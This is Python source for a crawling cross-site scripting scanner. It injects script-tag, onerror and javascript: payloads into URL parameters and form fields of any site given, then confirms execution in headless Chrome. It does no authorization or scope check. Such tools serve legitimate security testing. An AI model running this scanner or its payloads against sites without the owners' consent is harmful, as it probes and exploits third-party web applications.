# scanner.py (v4)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import argparse
import sys
import time
from collections import deque
import concurrent.futures # For concurrency
import os # To check file existence

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By # Added for DOM checking
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
DOM_PAYLOAD_ATTRIBUTE = 'data-xss-success'
DOM_PAYLOAD_VALUE = 'true'
# Default payloads if no list is provided
DEFAULT_PAYLOADS = [
    "<script>alert('XSS_Alert1')</script>",
    "'><script>alert('XSS_Alert2')</script>",
    f"<img src=x onerror=\"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}', '{DOM_PAYLOAD_VALUE}')\">", # DOM change payload
    "<img src=x onerror=alert('XSS_Alert4')>",
    "javascript:alert('XSS_Alert5')",
]
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS = 10

# --- Helper Functions ---

def load_payloads(filepath):
    """Loads payloads from a file, one per line."""
    try:
        if not os.path.exists(filepath):
             print(f"[!] Payload file not found: {filepath}", file=sys.stderr)
             return None
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]
        if not payloads:
             print(f"[!] Payload file is empty: {filepath}", file=sys.stderr)
             return None
        print(f"[*] Loaded {len(payloads)} payloads from {filepath}")
        return payloads
    except IOError as e:
        print(f"[!] Error reading payload file {filepath}: {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Unexpected error loading payload file {filepath}: {e}", file=sys.stderr)
        return None


def setup_driver():
    """Sets up the Selenium WebDriver."""
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])

    try:
        # Suppress WebDriver Manager logs which can be noisy
        os.environ['WDM_LOG_LEVEL'] = '0'
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(15)
        return driver
    except ValueError as ve:
         print(f"[!] WebDriver Manager Error: {ve}. Check network or cache.", file=sys.stderr)
         return None
    except WebDriverException as wde:
        print(f"[!] WebDriver Error during setup: {wde}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Failed to set up Selenium WebDriver: {e}", file=sys.stderr)
        return None

def confirm_xss_with_headless(url, driver):
    """Uses Selenium to visit a URL and check for an alert OR specific DOM change."""
    if not driver:
        return None, None

    print(f"  [*] Attempting headless confirmation for: {url[:100]}...")
    confirmation_type = None
    confirmation_detail = ""

    try:
        driver.get(url)
        time.sleep(0.1) # Small delay for JS rendering if needed

        # 1. Check for Alert first
        try:
            WebDriverWait(driver, CONFIRMATION_WAIT_TIMEOUT).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            confirmation_detail = f"Alert('{alert_text}')"
            print(f"  [+] CONFIRMED via Alert: {confirmation_detail}")
            alert.accept()
            confirmation_type = "Alert"
            return confirmation_type, confirmation_detail
        except TimeoutException:
            pass # No alert, proceed
        except UnexpectedAlertPresentException:
            try:
                alert = driver.switch_to.alert
                alert_text = alert.text
                confirmation_detail = f"Unexpected Alert('{alert_text}')"
                print(f"  [+] CONFIRMED via Unexpected Alert: {confirmation_detail}")
                alert.accept()
                confirmation_type = "Alert (Unexpected)"
                return confirmation_type, confirmation_detail
            except NoAlertPresentException:
                 print("  [!] Alert disappeared before handling.", file=sys.stderr)

        # 2. If no alert, check for specific DOM attribute change
        if not confirmation_type:
            try:
                # Wait slightly longer for DOM change potentially
                WebDriverWait(driver, 0.5).until(
                    lambda d: d.find_element(By.TAG_NAME, 'body').get_attribute(DOM_PAYLOAD_ATTRIBUTE) == DOM_PAYLOAD_VALUE
                )
                confirmation_detail = f"DOM attribute '{DOM_PAYLOAD_ATTRIBUTE}'='{DOM_PAYLOAD_VALUE}'"
                print(f"  [+] CONFIRMED via DOM Change: {confirmation_detail}")
                confirmation_type = "DOM Change"
                return confirmation_type, confirmation_detail
            except TimeoutException:
                # Attribute not found or value doesn't match within wait time
                pass
            except NoSuchElementException:
                print("  [!] Body element not found during DOM check.", file=sys.stderr)
            except Exception as e_dom:
                 print(f"  [!] Error during DOM check: {e_dom}", file=sys.stderr)

        print("  [-] No Alert or specific DOM change detected within timeout.")
        return None, None

    except TimeoutException:
         print(f"  [!] Page load timed out during confirmation: {url[:100]}", file=sys.stderr)
         return None, None
    except WebDriverException as wde:
         print(f"  [!] WebDriver error during confirmation for {url[:100]}: {wde}", file=sys.stderr)
         return None, None
    except Exception as e:
        print(f"  [!] Unexpected error during headless confirmation for {url[:100]}: {e}", file=sys.stderr)
        return None, None

def get_links(url, session, base_domain):
    """Fetches and parses HTML to find all valid links on the same domain."""
    links = set()
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type:
            # print(f"  [*] Skipping link extraction for non-HTML content: {url} ({content_type})")
            return set()

        soup = BeautifulSoup(response.content, 'html.parser')
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            try:
                # Ignore javascript: links during crawl
                if href.strip().lower().startswith('javascript:'):
                    continue
                full_url = urljoin(url, href)
                parsed_link = urlparse(full_url)
                if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == base_domain:
                    clean_url = parsed_link._replace(fragment='').geturl()
                    links.add(clean_url)
            except ValueError as ve_url:
                 print(f"  [!] Error parsing or joining URL '{href}' on page {url}: {ve_url}", file=sys.stderr)

        return links
    except requests.exceptions.Timeout:
        print(f"[!] Timeout fetching links from {url}", file=sys.stderr)
        return set()
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching links from {url}: {e}", file=sys.stderr)
        return set()
    except Exception as e:
        print(f"[!] Error parsing links from {url}: {e}", file=sys.stderr)
        return set()

def get_forms(url, session):
    """Fetches and parses HTML to find all forms."""
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type:
             # print(f"  [*] Skipping form extraction for non-HTML content: {url} ({content_type})")
             return []
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.Timeout:
        print(f"[!] Timeout fetching forms from {url}", file=sys.stderr)
        return []
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching forms from {url}: {e}", file=sys.stderr)
        return []
    except Exception as e:
        print(f"[!] Error parsing forms from {url}: {e}", file=sys.stderr)
        return []

def get_form_details(form):
    """Extracts details from a form element. More robust parsing."""
    details = {}
    action = form.attrs.get('action', '')
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    try:
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.attrs.get('name')
            if input_name is None: continue
            input_type = input_tag.attrs.get('type', 'text').lower()
            input_value = input_tag.attrs.get('value', '')
            if input_tag.name == 'select' and not input_value:
                 option = input_tag.find('option', selected=True) # Prefer selected option
                 if not option:
                     option = input_tag.find('option') # Fallback to first option
                 if option:
                     input_value = option.attrs.get('value', option.text) # Use text if no value

            inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
    except Exception as e:
         print(f"[!] Error parsing inputs for a form: {e}", file=sys.stderr)

    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

# --- Functions for Concurrent Execution ---

def task_test_url_param(url, param_name, payload, session):
    """Task for ThreadPoolExecutor: Tests a single URL parameter."""
    parsed_url = urlparse(url)
    try:
        query_params = parse_qs(parsed_url.query)
        if param_name not in query_params: return None

        modified_params = query_params.copy()
        modified_params[param_name] = [payload]
        modified_query = urlencode(modified_params, doseq=True)
        test_url = parsed_url._replace(query=modified_query).geturl()

        response = session.get(test_url, timeout=10, allow_redirects=True)
        response_body = response.content.decode(errors='ignore')
        final_url = response.url

        # More robust reflection check: case-insensitive? Or check structure?
        # For now, keep simple check.
        if payload in response_body:
            return {'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'payload': payload, 'final_url': final_url}
        return None

    except requests.exceptions.Timeout:
        # print(f"  [!] Timeout testing param '{param_name}'", file=sys.stderr) # Reduce noise
        return None
    except requests.exceptions.RequestException as e:
        print(f"  [!] Req Error testing param '{param_name}': {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"  [!] Error testing param '{param_name}': {e}", file=sys.stderr)
        return None

def task_test_form(form_details, url, payload, session):
    """Task for ThreadPoolExecutor: Tests a single form submission."""
    target_url = urljoin(url, form_details['action'])
    inputs = form_details['inputs']
    data = {}
    tested_fields = []

    for input_item in inputs:
        if not input_item.get('name'): continue
        # Decide which fields to inject into
        if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']: # Include hidden? Maybe optional.
            data[input_item['name']] = payload
            tested_fields.append(input_item['name'])
        else:
            data[input_item['name']] = input_item['value']

    if not tested_fields: return None

    try:
        response = None
        if form_details['method'] == 'post':
            response = session.post(target_url, data=data, timeout=10, allow_redirects=True)
        else:
            response = session.get(target_url, params=data, timeout=10, allow_redirects=True)

        response_body = response.content.decode(errors='ignore')
        final_url = response.url

        if payload in response_body:
            return {'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'payload': payload, 'final_url': final_url}
        return None

    except requests.exceptions.Timeout:
         # print(f"  [!] Timeout submitting form (Action: {form_details['action']})", file=sys.stderr) # Reduce noise
         return None
    except requests.exceptions.RequestException as e:
        print(f"  [!] Req Error submitting form (Action: {form_details['action']}): {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"  [!] Error submitting form (Action: {form_details['action']}): {e}", file=sys.stderr)
        return None

# --- Main Scanner Logic ---

# Modified scan_page to accept payload_list
def scan_page(url, session, driver, executor, payload_list):
    """Scans a single page using ThreadPoolExecutor for initial checks."""
    print(f"\n[*] Scanning {url}...")
    potential_vulnerabilities = []
    futures = []

    # 1. Submit tasks for URL Parameters
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if query_params:
        print(f"[*] Testing {len(query_params)} URL parameters ({len(payload_list)} payloads each)...")
        for param_name in query_params.keys():
            if not query_params[param_name]: continue
            for payload in payload_list: # Use the provided payload_list
                futures.append(executor.submit(task_test_url_param, url, param_name, payload, session))

    # 2. Submit tasks for Forms
    forms = get_forms(url, session)
    if forms:
        print(f"[*] Testing {len(forms)} forms ({len(payload_list)} payloads each)...")
        for form in forms:
            form_details = get_form_details(form)
            if not form_details['inputs']: continue
            for payload in payload_list: # Use the provided payload_list
                 futures.append(executor.submit(task_test_form, form_details, url, payload, session))

    # 3. Collect results from completed tasks (potential reflections)
    if futures:
        print(f"[*] Waiting for {len(futures)} reflection checks to complete...")
        processed_count = 0
        for future in concurrent.futures.as_completed(futures):
            processed_count += 1
            result = future.result()
            if result:
                potential_vulnerabilities.append(result)
                # Avoid printing for every potential hit if list is large
                # print(f"  [+] Potential Reflection found ({result['type']}) - Queued for confirmation.")
            if processed_count % 50 == 0: # Progress indicator
                 print(f"    Processed {processed_count}/{len(futures)} reflection checks...")
        print(f"[*] Reflection checks complete for {url}.")


    # 4. Perform Headless Confirmation (Sequentially)
    confirmed_vulnerabilities = []
    if driver and potential_vulnerabilities:
        unique_confirm_targets = {vuln['final_url']: vuln for vuln in potential_vulnerabilities}.values()
        print(f"[*] Performing headless confirmation for {len(unique_confirm_targets)} unique potential findings URLs...")
        confirmed_count = 0
        for potential_vuln in unique_confirm_targets:
            # Check only potential_vuln['final_url'] once per unique URL
            confirmation_type, confirmation_detail = confirm_xss_with_headless(potential_vuln['final_url'], driver)
            if confirmation_type:
                # Apply confirmation to all potential vulns matching this final_url
                for pv in potential_vulnerabilities:
                    if pv['final_url'] == potential_vuln['final_url']:
                        pv['confirmed'] = True
                        pv['confirmation_type'] = confirmation_type
                        pv['confirmation_detail'] = confirmation_detail
                        confirmed_vulnerabilities.append(pv) # Add confirmed instance
                        confirmed_count += 1
            # else: Mark as unconfirmed? Already default.

        print(f"[*] Headless confirmation complete. Confirmed {confirmed_count} instances.")


    # Return only confirmed vulnerabilities
    return [v for v in potential_vulnerabilities if v.get('confirmed')]


# --- Crawler ---
# Modified crawl to accept and pass payload_list
def crawl(start_url, max_depth, session, driver, executor, payload_list):
    """Performs a breadth-first crawl and scan."""
    if max_depth <= 0:
        print("[!] Max depth must be positive. Scanning starting URL only.")
        max_depth = 1

    base_domain = urlparse(start_url).netloc
    if not base_domain:
        print(f"[!] Could not determine base domain for URL: {start_url}", file=sys.stderr)
        return []

    queue = deque([(start_url, 0)])
    visited = {start_url}
    all_confirmed_vulnerabilities = []

    while queue:
        current_url, current_depth = queue.popleft()

        if current_depth >= max_depth:
            # print(f"[*] Max depth ({max_depth}) reached for branch starting at {current_url}. Stopping crawl here.")
            continue

        # Scan the current page, passing the payload_list
        confirmed_on_page = scan_page(current_url, session, driver, executor, payload_list)
        all_confirmed_vulnerabilities.extend(confirmed_on_page)

        # Find new links only if we can go deeper
        if current_depth < max_depth - 1:
            # print(f"[*] Discovering links on {current_url} (Depth {current_depth})...")
            new_links = get_links(current_url, session, base_domain)
            added_count = 0
            for link in new_links:
                if link not in visited:
                    visited.add(link)
                    queue.append((link, current_depth + 1))
                    added_count += 1
            # if added_count > 0:
                 # print(f"  - Added {added_count} new links to queue (Depth {current_depth + 1})")
        # else:
             # print(f"[*] Not discovering links on {current_url} as next depth ({current_depth+1}) would exceed max depth ({max_depth})")


    print(f"\n[*] Crawler finished. Visited {len(visited)} unique URLs.")
    return all_confirmed_vulnerabilities


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Scanner v4 (Payload Wordlist) - Use Responsibly!")
    parser.add_argument("url", help="The starting URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation (reports reflections only)")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS, help=f"Number of concurrent workers for reflection checks (default: {MAX_WORKERS})")
    # Added payload list argument
    parser.add_argument("-pL", "--payload-list", help="Path to a file containing payloads (one per line)")

    args = parser.parse_args()
    target_url = args.url
    max_depth = args.depth
    use_headless = not args.no_headless
    num_workers = args.workers
    payload_file = args.payload_list

    # Load payloads
    payloads_to_use = DEFAULT_PAYLOADS
    if payload_file:
        loaded_payloads = load_payloads(payload_file)
        if loaded_payloads:
            payloads_to_use = loaded_payloads
        else:
            print("[!] Failed to load payloads from file, using default list.", file=sys.stderr)
    else:
        print("[*] No payload list provided, using default list.")


    # Setup Selenium Driver
    driver = None
    if use_headless:
        print("[*] Setting up headless browser (Selenium)...")
        driver = setup_driver()
        if not driver:
            print("[!] Proceeding without headless confirmation.")
            use_headless = False # Ensure flag reflects reality
    else:
         print("[*] Headless confirmation disabled via command line.")

    # Use a session object
    session = requests.Session()
    session.headers.update({'User-Agent': 'XSSScanner/0.4 (+https://github.com/your-repo)'}) # Update version

    start_time = time.time()

    # Create ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # Pass the final list of payloads to the crawl function
        all_confirmed = crawl(target_url, max_depth, session, driver, executor, payloads_to_use)

    end_time = time.time()

    # --- Reporting ---
    print("\n--- Scan Summary ---")

    if all_confirmed:
        print(f"\n[***] Found {len(all_confirmed)} CONFIRMED XSS vulnerabilities:")
        # Sort or group results for better readability?
        for vuln in sorted(all_confirmed, key=lambda x: (x['url'], x.get('parameter', ''), x.get('action', ''))):
             details = f"Type: {vuln['type']}, Confirm: {vuln.get('confirmation_type', 'N/A')} ({vuln.get('confirmation_detail', 'N/A')}), Payload: {vuln['payload']}, Final URL: {vuln['final_url']}"
             if vuln['type'] == 'URL Parameter':
                 print(f"  - URL: {vuln['url']}, Param: {vuln['parameter']}, {details}")
             elif vuln['type'] == 'Form Input':
                  print(f"  - URL: {vuln['url']}, Form Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, {details}")
    else:
        print("\n[*] No vulnerabilities confirmed via headless browser (Alert or DOM change).")
        if not use_headless:
             print("    (Headless confirmation was disabled. Run without --no-headless for confirmation checks.)")


    print(f"\n--- Scan Finished in {end_time - start_time:.2f} seconds ---")

    # Cleanup Selenium Driver
    if driver:
        print("[*] Closing headless browser...")
        driver.quit()

